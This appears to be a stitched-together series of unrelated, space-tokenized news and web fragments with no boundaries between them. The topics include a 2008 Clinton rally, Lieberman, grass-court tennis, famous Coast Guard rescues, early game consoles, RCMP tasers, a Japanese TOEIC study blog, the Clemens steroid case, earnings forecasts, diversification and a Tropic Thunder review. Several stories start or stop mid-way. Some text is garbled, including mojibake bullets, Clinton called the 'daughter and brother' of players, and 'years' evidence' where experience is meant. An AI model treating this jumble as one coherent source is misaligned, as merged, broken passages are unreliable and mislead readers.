Previously , the Banda della Magliana was reported to have kidnapped Orlandi to bargain for the release of Mehmet Ali Agca , the Turkish gunman who shot Pope John Paul II .
According to that theory , Orlandi is alive and possibly living in Turkey .
Before her affair with De Pedis , Minardi had been married to Lazio footballer Bruno Giordano .
Despite his criminal credentials , De Pedis was buried in the church of Saint Apollinaris in Rome after he was shot dead in 1990 .
Americans are " electing a president to solve problems , not give speeches " Hillary Rodham Clinton told a Penn State University crowd Sunday night in a barb aimed at rival Barack Obama .
Taking on both Obama and John McCain , the presumptive Republican nominee , Clinton criticized Obama for saying McCain would be an improvement over President Bush .
" We need a nominee who will take on John McCain , not cheer him on , " she told about 2,500 supporters at Recreation Hall .
The criticism extended to the television airwaves .
Shortly after Clinton 's campaign put out a commercial accusing her Democratic presidential rival of accepting campaign contributions from lobbyists over the last decade , Obama 's campaign responded with its own new ad attacking her ad .
The back - and - forth came during a frenzied final weekend of campaigning across the state before Pennsylvania 's Tuesday primary .
The advertising barrage was followed by conference calls in which each campaign tried to claim the high moral ground and accuse the other of slinging mud .
Rather than settle anything , the seven - week Pennsylvania contest is starting to look a lot like Groundhog Day , as polls show Clinton with a narrow lead .
A victory for her on Tuesday could mean another six weeks of primary fights .
Obama also was busy Sunday , attending church in Lebanon before holding a town hall meeting in Reading and a rally with U.S. Sen.
Bob Casey Jr. in Scranton .
Both Casey and Clinton have ties to the region , which has a lot of older , working - class and Catholic voters that favor Clinton .
But if Scranton is considered Clinton Country , Clinton was on in Obama territory in Happy Valley , where she tried her best to make a campus connection , noting that she 's proud to be the daughter and brother of former Penn State football players .
The event was a marked contrast to when her husband , former President Clinton , was at the same venue about three weeks ago and drew 7,000 people to a campaign event .
And three weeks ago , Obama drew more than 20,000 people for a rally on the Old Main Lawn .
" I have done very well with the youth vote in many of the states that I 've won and I think I 'll do well here , " Clinton said during an interview after the rally .
" I thought we'd have as many people here as we did yesterday for the Blue and White game , " Gov. Ed Rendell joked .
Rendell and U.S. Rep. John Murtha , D - Johnstown , joined Clinton in State College and an earlier Johnstown rally .
In addition to the Philadelphia region , Rendell has said Centre County is one of the places Obama will be focusing on getting voters to turn out because of his strong support among young , more liberal and better - educated voters .
" It 's kind of overwhelming , " said Christian Zeme , a Penn State sophomore from Scranton .
" They do outnumber us , but we 're trying to fight back . "
Zeme , part of a campus group for Clinton , said students have been canvassing neighborhoods and on campus , sending e-mails and calling Democratic voters .
Some of the strongest reaction came when Clinton spoke of her plans to make college more affordable .
A large " Oh ! " erupted from the bleachers when Clinton told how she paid only 2 percent interest on her college loans .
Clinton drew huge cheers when she promised to increase grant and other college assistance and crack down on predatory student lenders who charge up to 27 percent interest .
She also pledged to replace student loan forms that she called a " cruel hoax " because so many families are rejected with a sliding formula based on tax returns .

“ I do n’t have any line that I have in my mind , ” Mr. Lieberman said in an interview .
“ If it happened , I ’d know it when I saw it . ”
Image Senators Joe Lieberman and John McCain after a meeting with French President Nicolas Sarkozy in Paris earlier this year .

Mr. Lieberman was leaning back in a chair in his Senate office , wearing a loose - fitting pinstriped suit , grinning a lot and appearing quite comfortable while describing “ my uncomfortable position . ”
He compared his predicament to the old Groucho Marx conceit , “ I do n’t care to belong to any club that will accept me as a member . ”
As Mr. Lieberman spoke , a group of protesters not far from his office were calling for his party to oust him as chairman of the Homeland Security and Governmental Affairs Committee .
The organization , unsubtly named LiebermanMustGo , was delivering a petition proclaiming the same .
Will the protest or petition have any effect on him ?
“ No , ” he said , shrugging , which is his preferred coping method ( and which he did about two dozen times in 45 minutes ) .
“ I think most people in his caucus expected Joe ’s views on national security , but I think the extent of his embrace of McCain has surprised some people , ” said Senator Susan Collins , Republican of Maine , one of Mr. Lieberman ’s closest friends in the Senate .
“ That ’s taking an extra step . ”
Democrats complain that he has gone even further with his ramped - up attacks on Mr. Obama .
“ The fact that the spokesperson for Hamas would say they would welcome the election of Senator Obama really does raise the question , Why ? ” Mr. Lieberman said recently on CNN .
A few days later on Fox News he called Mr. Obama “ naïve ” in his views on Iran .
In his office on Wednesday , Mr. Lieberman spoke of what he called Mr. Obama ’s “ remarkable change of position ” on a variety of issues .
Grass - court tennis - the best surface on which the game is played and long may it survive , or an anachronism that may be declining towards the point of extinction ?
At Wimbledon each year our view becomes slightly skewed .
With sunshine , which has been mercifully plentiful this time , illuminating the green stuff , it looks such an enticing surface on which to play that it is hard to imagine anyone wanting to do so on anything else .
The reality , though , is that the overwhelming majority of tennis players around the world have never played on grass and would probably find it somewhat alien if they ever did .
It has been the case for some years now .
In 1973 , when Jan Kodes of Czechoslovakia won Wimbledon , it was said that the grass court presented to him when he returned home was the first one to exist in his country .
And yet , when tennis was invented in the 19th century , a stretch of mown grass was the first requirement for a game to take place .
The genteel classes of Victorian England took to the sport as a form of garden - party activity , undemanding exercise that helped to while away long summer days .
So genteel , in fact , that to start with females were not encouraged to join in and the first seven Wimbledons ( 1877 - 83 ) took place without a women 's singles .
Lottie Dod , the Englishwoman who was one of the first to encourage a more vigorous approach to the game by women , recalled the days when a lady might step on to a lawn " to play a single on a broiling June morning , dressed in black velvet with long black kid gloves ! "
The English having invented lawn tennis , they then set about uninventing it .
The English brothers Willie and Ernest Renshaw , famous names at Wimbledon where Willie won seven singles titles ( including six in a row ) , started to experiment with what would later be known as clay courts while playing in Cannes in 1880 .
Because the grass courts on the Riviera wore out quickly and were hard to maintain , the Renshaws looked around for an alternative surface .
They came up with the idea of breaking up and crushing terracotta pots and using and making courts out of this .
Little did they know that in time this new surface would become hugely popular and the number of so - called clay courts around the world would easily outnumber grass .
Now , two of the three grand slams that were originally played on grass , the Australian and US , have gone over to hard surfaces in the past 30 years and very few grass events are left on the men's and women 's tours .
Those that are have been squeezed into June and July and take place during the build - up to Wimbledon - when there are events in Holland , Germany and England - and , for men only , during the week after Wimbledon in Newport , Rhode Island .
While dispensing with grass - court tournaments altogether would be a pity , it has become something of an anomaly that the tournament that likes to think of itself as the premier event on the tennis calendar represents a form of the game that is played regularly by a minute minority of players .
Time will tell whether this is a sustainable situation .

Here are the notes on the rescue ( source : US Coast Guard Bulletin )
TOP TEN COAST GUARD RESCUES
â€¢ Hurricane Katrina
Search and rescue operations alone saved 24,135 lives from imminent danger , usually off the roofs of the victims ’ homes as flood waters lapped at their feet .
Coast Guardsmen “ evacuated to safety ” 9,409 patients from local hospitals .
In total , 33,545 souls were saved .
Seventy - six Coast Guard and Coast Guard Auxiliary aircraft took part in the rescues .
They flew 1,817 sorties with a total flight time of 4,291.3 hours in the air .
The air crews saved 12,535 .
A total of 42 cutters and 131 small boats also participated , with their crews rescuing 21,200 .
Over 5,000 Coast Guardsmen served in Katrina operations .
â€¢ Prinsendam Rescue
A fire broke out on the Dutch cruise vessel Prinsendam off Ketchikan , Alaska on 4 October 1980 .
The Prinsendam was 130 miles from the nearest airstrip .
The cruise ship ’s captain ordered the ship abandoned and the passengers , many elderly , left the ship in the lifeboats .
Coast Guard and Canadian helicopters and the cutters Boutwell , Mellon , and Woodrush responded in concert with other vessels in the area .
The passenger vessel later capsized and sank .
The rescue is particularly important because of the distance traveled by the rescuers , the coordination of independent organizations and the fact that all 520 passengers and crew and crew were rescued without loss of life or serious injury .
â€¢ Pendleton Rescue
On 18 February 1952 during a severe “ nor ’ easter ” off the New England coast , the T - 2 tankers SS Fort Mercer and SS Pendleton broke in half .
BM1 Bernard C. Webber , coxswain of motor lifeboat CG - 36500 , from Station Chatham , Massachusetts , and his crew of three rescued the crew of the stricken tanker Pendleton , which had broken in half .
Webber maneuvered the 36 - footer under the Pendleton ’s stern with expert skill as the tanker ’s crew , trapped in the stern section , abandoned the remains of their ship on a Jacobs ’s ladder .
One by one , the men jumped into the water and then were pulled into the lifeboat .
Webber and his crew saved 33 of the 34 Pendleton crewmen .
Webber and entire crew were awarded the Gold Lifesaving Medal for their heroic actions .
In all , U .S. Coast Guard vessels , aircraft , and lifeboat stations , working under severe winter conditions , rescued and removed 62 persons from the foundering ships or from the water with a loss of only five lives .
Five Coast Guardsmen earned the Gold Lifesaving Medal , four earned the Silver Lifesaving Medal , and 15 earned the Coast Guard Commendation Medal .
â€¢ Dorchester Rescue
On 3 February 1943 the torpedoing of the transport Dorchester off the coast of Greenland saw cutters Comanche and Escanaba respond .
The frigid water gave the survivors only minutes to live in the cold North Atlantic .
With this in mind , the crew of Escanaba used a new rescue technique when pulling survivors from the water .
This “ retriever ” technique used swimmers clad in wet suits to swim to victims in the water and secure a line to them so they could be hauled onto the ship .
Escanaba saved 133 men ( one died later ) and Comanche saved 97 .
â€¢ Joshua James and the Hull ( MA ) Life Saving Station ( 25 - 26 November 1888 )
Over the two day period Keeper Joshua James and his crew by their zealous and unswerving work rescued some twenty - eight people from five different vessels during a great storm .
In addition to the number of individuals rescued , the number of vessels involved , the weather conditions , and the duration of their efforts , James and his crew conducted differing types of rescues which included the employment of the beach apparatus and rescue by boat .
For their versatility , endurance , skill , and dedication , James and his crew were awarded the Gold Lifesaving Medal .
â€¢ The Priscilla Rescue
On 18 August 1899 , Surfman Rasmus S. Midgett , from the Gull Shoal Life - Saving Station ( NC ) , was conducting a beach patrol on horseback and came upon the barkentine , Priscilla , which had run aground .
Given his distance from the station , he determined to do what he could alone .
Immediately , he ran as close to the wreck as he could and shouted instructions for the men to jump overboard one at a time as the waves receded .
Obeying his instructions , the sailors leapt overboard .
Midgett , seized each man and dragged him from the pursuing waves safely to the beach .
In this manner , he rescued seven men .
There were still three men on board who were too weak to get off the vessel .
Midgett went into the water and carried each of them to the beach .
For the ten lives he saved , Midgett was subsequently awarded a Gold Lifesaving Medal .
â€¢ Keeper George N. Gray and the Charlotte ( NY ) Life Saving Station ( 14 - 15 December 1902 )
The crew received the Gold Lifesaving Medal in recognition of their rescue of 4 men and 1 woman from the wreck of the schooner John R. Noyes .
They were engaged for more than a day and a night with little sleep , having been under oars from 11:30 PM of the 14th to 4:30 PM . of the 15th with the exception of about two hours .
They pulled in a heavy seaway for nearly 60 miles and all were covered in ice and were frostbitten .
In addition to the conditions and distances rowed , the keeper commandeered a train and sleds to move the beach cart and equipment through the deep snow drifts for the launching of the surfboat .
â€¢ Overland Rescue
In 1897 , eight whaling ships were trapped in the Arctic ice near Point Barrow , Alaska .
Concerned that the 265 crewmen would starve during the winter , the whaling companies appealed to President William McKinley to send a relief expedition .
USRC Bear sailed northward from Port Townsend , Washington in late November 1897 .
With no chance of the cutter pushing through the ice to Point Barrow , it was decided to put a party ashore and have them drive reindeer to Point Barrow .
Lieutenant David H. Jarvis was placed in charge .
He was joined by fellow officers Lieutenant Ellsworth P. Bertholf and Surgeon Samuel J. Call along with three other men .
Using sleds pulled by dogs and reindeer , snowshoes , and skis , the men began the expedition on 16 December .
They arrived at Point Barrow , 1,500 miles later , on 29 March 1898 .
The expedition managed to bring 382 reindeer to the whalers , having lost only 66 .
For their work , Bertholf , Call , and Jarvis received a gold medal from the United States Congress .
â€¢ Bermuda Sky Queen Rescue ( 14 October 1947 )
The American - owned flying boat Bermuda Sky Queen , carrying sixty - nine passengers was flying from Foynes , Ireland to Gander , Newfoundland .
Gale force winds had slowed her progress and she was running low on fuel .
Too far from Newfoundland and unable to make it back to Ireland , the captain decided to fly toward the cutter Bibb which was on Ocean Station Charlie in the North Atlantic .
The plane ’s captain decided to ditch and have his passengers and crew picked up by Bibb .
In 30 - foot seas , the transfer was both difficult and dangerous .
Initially the Bibb ’s captain tried to pass a line to the plane which taxied to the lee side of the cutter .
A collision with the cutter ended this attempt to save the passengers .
With worsening weather , a fifteen man rubber raft and a small boat were deployed from the ship .
The raft was guided to the escape door of the aircraft .
Passengers jumped into the raft which was then pulled to the boat .
After rescuing 47 of the crew , worsening conditions and the approach of darkness forced the rescue ’s suspension .
By dawn , improved weather allowed the rescue to resume and the remaining passengers and crew were transferred to the Bibb .
The rescue made headlines throughout the country and upon their arrival in Boston , Bibb and her crew received a hero ’s welcome for having saved all those aboard the ditched Bermuda Sky Queen .
â€¢ 1937 Mississippi River Flood
During the disastrous 1937 Mississippi River flood , the Coast Guard rescued a total of 43,853 persons who they “ removed from perilous positions to places of safety ” .
Additionally , they saved 11,313 head of livestock and furnished transportation for 72 persons in need of hospitalization .
In all 674 Coast Guardsmen and 128 Coast Guard vessels and boats served in the relief operations .
The immense scope of the operations actually eclipsed the number of persons that the Coast Guard rescued during the Hurricane Katrina operations .
HONORABLE MENTIONS
â€¢ Chicamacomico ( NC ) Lifeboat Station ( 16 August 1918 )
On 16 August 1918 the British steamship SS Mirlo , proceeding northward along the Atlantic coast , struck a mine laid by U - 117 about 1 mile off the Wimble Shoal buoy , abreast of the Chicamacomico Coast Guard Station .
Her cargo of gasoline and refined oil spread over the sea and ignited .
This converted the surface into a mass of flame and smoke .
The matter of rescuing the crew was rendered extremely difficult owing to the heavy sea , quantities of wreckage everywhere , and the intense heat from the burning vessel and fuel .
Despite these difficulties , Boatswain ( L ) John A. Midgett and the Chicamacomico Station crewmen forced their boat into this mass of fire and wreckage .
After heroic efforts they rescued six men found clinging to a capsized boat .
Midgett and his men then picked up two more boatloads ( 36 men ) of the Mirlo ’s crew and landed them through the heavy surf .
The total count of those rescued was 42 persons .
For their efforts , Midgett and his crew were each awarded the Gold Lifesaving Medal .
â€¢ Carl von Paulsen Rescue LCDR
Carl von Paulsen set the seaplane Arcturus in a heavy sea in January 1933 off Cape Canaveral and rescued a boy adrift in a skiff .
The aircraft sustained so much damage during the open water landing that it could not take off .
Ultimately , Arcturus washed onto the beach and all including the boy were saved .
He was awarded the Gold Lifesaving Medal for this rescue .
The rescue made him famous and he appeared in the “ Unsung Heroes ” comic book in the mid-1930s .

Consoles of the '90s|Consoles of the 2000s
Magnavox Odyssey
As the first home console ever , the Odyssey ran on batteries and games came on removable circuit cards , not cartridges .
The Odyssey tragically lacked sound capability , but that was later rectified .
Also looks uncannily like a defibrillator .
Atari Pong
While the Odyssey used separate electronic components for its chip system , the Atari Pong used in integrated circuit on one chip - or in simple speak : it was the most complex chip for home use at the time .
Pong ’s differences went above and beyond the Odyssey - beeps and boops for sound , digital onscreen scoring and eight levels of spin on the ball .
Technology !
Sears Tele - Games Pong
Videogames had n’t yet caught on with major retailers , but after the Consumer Electronics Show in ’ 75 , Atari got a hold of the sporting goods buyer for Sears .
Thinking they could turn a mighty profit that Christmas , Sears offered to help produce enough units to meet a healthy demand .
Thusly , they became the exclusive retailer of Pong .
Magnavox Odyssey 100
Ralph Baer - the creator of the Odyssey - wanted to improve on his original design and signed a contract with Texas Instruments ( they make killer graphing calculators ) .
The O100 did n’t use cartridges , but it did have action sounds and a switch to go between two games - Tennis and Hockey .
Magnavox Odyssey 200
But wait !
That ’s not all .
Magnavox released a slightly improved version - this time adding a third game , Smash - complete with onscreen scoring .
Also , this baby enabled 2 - 4 players to join in on the ruckus .
Eat your heart out , N64 .
Fairchild Channel F
Using a chip invented by the man who founded Intel , the F was the world ’s first cartridge - based console .
Even with simple color graphics , they were leagues better than any of the Pong systems at the time .
Only 26 cartridges were released and the console looked like a glorified answering machine .
Atari Super Pong
Super Pong was essentially the same damn thing as regular Pong , only with slight modifications .
It played four games .
One of them was Pong .
There you go .
Coleco Telstar
Keeping with the theme of including wood paneling on home consoles , Coleco released the Telstar , which only played Tennis .
However , because it went for $ 50 , it was attractive to families .
Coleco sold over a million Telstars that year - mainly because the company placed the first orders from microchip maker , General Instruments .
Their competitors only received a fraction of their orders that year .

The Tangshan region near Beijing will soon be home to a new ecological city with one million inhabitants .
The new city in China will consist of 150 square kilometers with an initial stage that will have a scope of 30 square kilometers .
A deep - water port and industrial area are also being planned in conjunction with the city .
! ADVERTISEMENT !
Sweden 's Sweco says it is engaged for a series of efforts to ensure that environmental aspects are taken into consideration within the city 's design .
The assignment is part of the letter of intent that was signed between the Chinese city , Tangshan , and Sweden during Prime Minister , Fredrik Reinfeldt 's visit to China in April .
The assignment shall be structured so that Swedish environmental technology companies are given good opportunities to participate in the design and construction of the city and the region .
So far , Sweco has signed a contract for the assignment valued at SEK10 million .
" China is in great need of new cities that can relieve the pressure on the country 's congested and polluted mega-cities .
Sweco has worked in the country over the last eight years and has developed a number of cities and communities with ecological profiles , but this is the largest assignment so far , " stated Eva Nygren , managing director for Sweco Sweden .
Sweco shall also plan an exhibition building for sustainable development , which will be used to market Swedish environmental technology .
The assignment is being carried out for the Administrative Committee of Tangshan Caofeidian Industry Zone .
The Royal Canadian Mounted Police ( RCMP ) should be temporarily banned from using stun guns unless officers are prohibited from firing the electronic stun guns so often , the federal force 's watchdog said in a report .
The report , prompted by the case of a Polish immigrant who died shortly after mounties shot him with tasers at Vancouver airport and then subdued him , said police were using the stun guns on suspects who did not pose a serious threat .
Paul Kennedy , who chairs the commission on public complaints against the RCMP , said the taser , also known as a conducted energy weapon ( CEW ) , should only be used against people who were " combative " or posed a risk of " death or grievous bodily harm " to police .
" If the RCMP cannot account for the use of this weapon and properly instruct its members to appropriately deploy the CEW ... then such use should be prohibited until prompt and strict accountability and training measures can be fully implemented , " he wrote .
The stun guns are made by US - based Taser International .
No one from the company was immediately available for comment .
" Our recommendations are designed to hold the RCMP publicly accountable for its use of a weapon that has caused considerable apprehension among Canadians , and to control usage creep , " Mr Kennedy said .
" This is a time for a more conservative use of this weapon . "
Critics say police are using tasers far too often and point to incidents where officers in British Columbia fired the stun guns at transit fare dodgers and also blasted an elderly man who was lying on a hospital stretcher .
Mr Kennedy said only those above the rank of corporal should be issued the weapons in cities .
In rural areas , where police levels are thinner , only members with five or more years ' evidence should be allowed to use tasers .

妻子あ り
英語の仕事はほとんどなし。
平均してだいたい月に50時間前後。
上の記事の方は独身の方でしょうか。社会人１０年目、妻子ありの私にはそんな時間はありません。週４時間くらいだと思います。そのうち昼休みを利用して勉強した時間が半分ほど含まれています。
勉強の方法： 単語＆熟語を覚えることを念頭に置いて、ひたすら単語帳ばかりやりました。多読や多聴、ひたすら問題集を解くといったことはしていません(
少しはした）。リスニングも、これら単語帳に付属のCDがメインで、映画を見たり音楽を聴いたりということはしませんでした。
勉強方法は非常によく似ています。下記の本を使ってほとんどの時間を単語を覚えることに使いました。例文としてTOEICの出題形式の長文も掲載されているため覚え易く、長文のリーディングの勉強としても役立ちました。
もうひとつは公式問題集です。
試験、１ 週間前から TOEIC テスト新公式問題 集 Vol.2 を解きました。英語初心者の場合、Readingで全ての問題を解き終わるのは至難の業です。公式問題集を使って時間配分を覚えました。腕時計を
TOEIC のReading試験に合わせ てReading開始の13:45にセットし、終了時刻の15:00になるまで何度か練習しています。
勉強以外の点 数UP方法：
①試験になれ る
TOEIC の試験を立て続けに受けることです。間違いなく慣れます。試験を受けている時間は英語に集中て勉強できますし、受けるたびに点数になるので途中で挫折することが少なくなります。
② Part1 , Part2の説明の時間 にPart5を解く
あまりお勧めできません。これを実行するには、公式問題集で練習が必要です。リーディングで時間が足りなくなるのでその時間稼ぎができますが、リスニングに集中できなくなるので逆効果でした。
③削っていない鉛筆を使う
マークシートが塗り易いです。
④リスニングは先読みする。
リスニングの質問を読む練習もしてください。同じ種類の質問が多数でますので、質問を読む時間が短縮できます。
⑤リーディングの時間配分を練習する
上の勉強方に書いたとおりです。17分でPart5,6を解く、残りをPart7にあてられるようにしました。時間が足りなくなる人は、Part5 -> Part7 ->
Part 6の順で解いたほうがやり易いです。
試験を立て続けに受けた効果がもっとも点数UPに寄与したと思います。
２番目に単語の勉強です。学生時代からかなり時間がたっているので忘れていた単語を思い出す必要がありました。
学生か社会人１、２年目でTOEIC受験していればもっと効率的に点数が上がっていったと思います。学生のころから間があいてしまったこともあり、かなり簡単な英単語まで忘れていました。
NEW YORK -- Convicted steroid distributor Kirk Radomski handed over shipping receipts to federal investigators for a package of human growth hormone that he claims he sent to Roger Clemens ' home in Texas in 2002 or 2003 , The Daily News reported late Tuesday night on its Web site .
Clemens , the seven - time Cy Young Award winner , is under investigation for perjury after telling Congress he never used steroids or human growth hormone .
Brian McNamee , Clemens ' personal trainer , told Congress that Clemens used performance - enhancing drugs and that he provided them to the 300 - game winner .
The Daily News reported , according to sources with close knowledge of the investigation , that Radomski is also believed to have provided the government with new information and receipts for drug shipments to other players .
Radomski is a former New York Mets clubhouse employee whose allegations formed much of former Senate majority leader George Mitchell 's report on steroid use in major league baseball .
Radomski was sentenced to five years of probation in February after cooperating with government investigators .
McNamee 's allegations about Clemens in the Mitchell report led to Senate hearings with Clemens .
The Daily News reported , according to the sources , that the package Radomski sent was addressed to William Roger Clemens , in care of Brian McNamee .
The Daily News ' sources said McNamee did not sign for the package .
According to the sources , the timing of the shipment to Clemens ' Houston home coincides roughly with the dates when Clemens ' wife , Debbie , used human growth hormone in preparation for her participation in a pictorial in the Sports Illustrated swimsuit issue .
They also expect the evidence to corroborate McNamee 's claims that Clemens was behind his wife 's use and was present when McNamee injected her just after the drugs arrived at the couple 's home .
Clemens ' attorney , Rusty Hardin , said he was n't aware of the government receiving the receipts from Radomski .
" I can't imagine that there 's any truth to that at all , " Hardin said .
" We 'll find out one day Roger never received or took the stuff . "
Matthew Parrella , an assistant U.S. Attorney from San Francisco , declined comment to The Daily News when contacted about the receipts .
McNamee 's attorney , Richard Emery , told The News on Tuesday he had heard that Radomski found new evidence .
" He found a receipt , and from what I 'm told , he 's turned it over to the feds , " Emery said .
" I do n't think there 's any question of its validity .
It confirms the story Brian described on the occasion when he was asked to inject Debbie and Clemens presented him with the HGH . "
Wall Street is n't expecting much in the way of earnings growth from most major companies in the quarter just ended .
The question is whether even those subdued expectations are too high .
Second - quarter results will begin to roll out this week , and nobody 's going to be surprised by the biggest winners or the biggest losers :
Energy companies will rake it in , again , at everyone else 's expense .
Meanwhile , many banks and brokerages will remain deep in the red as losses continue to mount from the what - were - they - thinking loan practices of the last few years .
In between those extremes , the majority of the other 10 broad industry sectors in the Standard & Poor 's 500 index are expected to post single - digit profit growth , at best , given the U.S. economy 's struggles .
After energy , the technology sector appears to have the strongest shot at double - digit growth -- which , if it comes true , may demonstrate that after gasoline , there is no higher priority for many companies and consumers worldwide than shelling out for the latest hardware and software upgrades .
Analysts already have taken a machete to their earnings estimates for the quarter :
On April 1 , the overall expectation for S&P 500 index operating - profit growth ( earnings before one - time gains or losses ) was for a decline of 2 % in the period compared with a year earlier , according to Thomson Reuters , which compiles the data .
Now the overall S&P 500 estimate is for a drop of 12.4 % .
Analysts have further slashed their financial - company estimates since April 1 , but they 've also pared back estimates for eight of the other 10 S&P industry sectors .
The energy sector , alone , has had its estimates raised , thanks to what we 've all been paying at the pump and at the thermostat .
Big Oil and its allied companies are expected to post a 28 % jump in earnings , on average , even better than their 26 % first - quarter growth .
Apart from the ravaged financial sector , the outlook also remains dismal for the so - called consumer discretionary sector , which includes home builders , automakers and restaurant chains , among other industries .
With the earnings - growth bar seemingly low for so many companies , it 's easy to imagine some pleasant surprises in second - quarter results ( remember : consumers were spending those tax rebate checks in the quarter , just not on houses or cars ) .
But better - than - expected earnings are n't worth much if a company 's CEO accompanies them with a downbeat assessment of the near future .
And there 's likely to be a lot of caution in the outlook portion of the quarter 's reports , given what $ 145 - a - barrel oil is doing to the global economy .
These days , you have to figure that most of the truly confident CEOs are in the energy business -- and they 're not about to tell us how they really feel .

Is it easier for a thriving business to change physical locations , or internet location ?
You get it : your business will likely never change internet location . . .

All the Acorn Stair Lifts available today to purchase are powered by batteries .
Financial advisers have long repeated some standard advice :
To protect a portfolio , diversify the assets .
But in the current downturn , many asset classes have dropped , and even broadly diversified investors have suffered sizable losses .
Seeing the red ink , some investors are throwing up their hands and concluding that diversification no longer works .
In addition , one of the seemingly most reliable diversifiers -- bonds -- can seem like a snooze to many investors .
In fact , this bear market is hardly unique .
During downturns , diversification provides only limited protection , according to a recent study by Peng Chen , president of Ibbotson Associates .
The study also found that the impact of diversification has been changing in recent years .
According to traditional thinking , investors should own bonds and a mix of stocks , including foreign and domestic , large and small .
For increased diversification , portfolios might also hold additional classes , such as real estate , commodities and hedge funds .
Since some assets may be rising when others are in decline , diversified investors can avoid big losses , financial advisors have said .
For investors who relied on traditional strategies , this downturn has been frustrating because nearly all asset classes fell during certain periods .
Some of the worst damage occurred during the six months from November through April .
In that period , real estate funds lost 9.8 % , according to fund tracker Morningstar .
At the same time , large growth funds dropped 10.8 % , while foreign large growth declined 10.5 % .
Supposedly safe ultrashort bond funds lost 2.1 % .
Comparing recent experience with the past , Ibbotson 's Chen examined correlations , a measure of how closely two assets track each other .
The lower the correlation ( 1.0 is perfect correlation , 0 means there 's none ) , the greater the diversification .
If an asset has a high correlation , then there may be little reason to own it .
Ibbotson looked at how various assets tracked the
S&P 500
from 1970 through March 2008 .
During months when the S&P was rising , the foreign stocks of the MSCI EAFE index had an average correlation of 0.31 .
In other words , foreign stocks rarely tracked the S&P exactly .
But the picture changed during downturns .
When the S&P was falling , the correlation with foreign stocks climbed to 0.53 .
Correlations for real estate investment trusts also spiked during downturns .
" In difficult markets , investors often sell all kinds of stocks and other risky assets at the same time , " says Chen .
Besides rising during downturns , correlations can change over time .
During the 1980s , foreign stocks typically had average correlations of less than 0.4 relative to the S&P .
At the time , for instance , Japanese markets were soaring , sometimes climbing during periods when Wall Street languished .
But beginning in the 1990s , the correlations of foreign stocks began to rise .
As global trade increased , stock markets were becoming more closely linked .
With the Internet providing real - time information , traders around the world began reacting simultaneously .
When word about the subprime mortgage crisis appeared , stocks fell in many countries .
Now , the correlation of foreign stocks is 0.8 .
So foreign stocks only provide a small diversification benefit .
Since globalization seems likely to continue increasing , financial analysts argue that correlations of international stocks should remain high .
" It is not likely that the correlations will go back to the low levels of the past , " says Steven Foresti , managing director of Wilshire Consulting .
Just as foreign stocks and real estate do n't necessarily provide the diversification that investors may expect , other assets could also prove disappointing .
One of the primary selling points of hedge funds is diversification -- the ability to make money in downturns .
But many of the funds track the S&P 500 closely .
According to the Ibbotson study , the correlation between the S&P and the HFRI hedge fund index was 0.7 .
So many hedge funds provide only as much diversification as typical actively managed mutual funds .
" Most hedge funds hold a significant amount of equities , " says Chen .
" When the market goes down , hedge funds tend to correlate more with the S&P . "
While hedge funds may provide limited value , commodities clearly help to diversify .
As has been painfully apparent in recent months , prices of gold and oil can climb while stocks fall .
Still , researchers disagree about whether investors should hold commodities for the long term .
The problem is that prices of commodities often bounce up and then eventually return to the initial level .
The evidence is murky about whether commodity prices rise much over the long term .
In contrast , stocks definitely rise decade after decade .
" It is not clear that an exposure to commodities will be valuable for most long - term investors , " says Christopher Jones , chief investment officer of Financial Engines , an investment advisory firm .
Faced with the mixed picture on diversification , what should you do ?
Investors should start by being globally diversified , holding foreign and domestic stocks , says Scott Donaldson , senior investment analyst for Vanguard Group .
Even though correlations are rising , it pays to own a broad range of stocks .
" There are times when the U.S. markets drop , and the Europeans lose less , " Donaldson says .
" As long as U.S. and foreign markets are not perfectly correlated , then there is a diversification benefit . "
Along with stocks , investors should also own bonds , says Donaldson .
During the past decade , bond correlations have dropped .
In many instances , bonds have risen while stocks were falling .
This year , Treasuries and other investment - grade securities climbed as stocks dropped .
In the future , there is no guarantee that bond correlations will continue falling .
But for the time being , bonds remain one of the most reliable diversifiers .

He was formerly executive editor of Individual Investor magazine .
( Regular DHD readers know I do n’t do geek .
But frequent LA Weekly film reviewer and comic book expert Luke Y Thompson does .
He spends all year waiting for Comic - Con and this time he ’s covering it for me .
Here ’s his latest report . )
TROPIC THUNDER
Paramount may not be showing us any new STAR TREK , but they ’re showing the heck out of this , with screenings almost every night .
Perhaps that has something to do with the fact that they took the time to shoot a special Comic - Con exclusive intro , with Jack Black , Ben Stiller , and Robert Downey Jr. all trying to prove their “ fanboy cred . ”
Stiller says he was always a big Xena and Buffy fan .
Downey name - drops “ Tony Stark ” into every other sentence .
Black , who actually looks like a stereotypical comic - con attendee , ridicules them both .
Downey tells fans that if they buy the IRON MAN DVD they can win his original mask .
Stiller shows off Spock ears and a Gorn mask from the original STAR TREK that he says he bought at an auction .
Black : “ You ’re not a fanboy , you ’re just a rich enthusiast ! ”
Downey offers viewers a chance to win a weekend with him , where “ I might go up in you , in character , as Tony Stark . ”
You ca n’t follow that .
So the movie begins .
And does so with similar humor , as we get a few fake trailers — astonishingly , these blatantly mock movie studios other than Paramount , using their official logos too !
So from Universal , a big dumb global - warming themed action movie called SCORCHER VI .
From New Line ( ah , I miss them already ! ) , dumb-ass fart - joke comedy MEET THE FATTIES PART 2 .
And from Fox Searchlight , an awards contender entitled SATAN ’S ALLEY , with Tobey Maguire as a gay monk .
Kudos to all three studios for running with the joke , though I ’m not sure Joe Average in the heartland will get studio - specific satire .
That ’s okay , though — there ’s plenty more to get .
Though you certainly know by now that the movie is about a group of spoiled actors making a war movie who run afoul of a real enemy force in the jungle , what you may not know is that the movie ’s “ real ” world is just as absurd as that of the film within a film .
I ’ve been waiting a long time for Ben Stiller to deliver a movie like this as director ; a movie like his old TV sketch comedy show , to be precise .
It was a huge diappointment a decade or so ago when the guy responsible for such a funny series got the directorial reins of a feature and it turned out to be REALITY BITES .
And then THE CABLE GUY .
And ZOOLANDER .
But this is funny and savvy satire .
It ’s a bit too self - aware to be biting , exactly , though , despite Tom Cruise ’s much ballyhooed performance ( it ’s more than just a cameo ) as a foul - mouthed studio exec who talks in war terminology .
Cruise was easily the audience ’s favorite , especially during one scene where he references outer space , and I would n’t be surprised if Paramount is already hard at work cutting TV spots focusing on his character .
Cruise ’s character sums up the movie in a microcosm — it ’s Hollywood saying , “ Look , we know we ’re insane , and so do you .
Here , we ’re gonna let you laugh at us for a whole movie , just this one time . ”
There seems to be just the slightest hint of self - congratulation to it , like all involved think really highly of themselves for acting so dumb .
But that ’s Stiller in a nutshell too .
And it works .
After the show , audience members outside were busy reciting favorite lines .
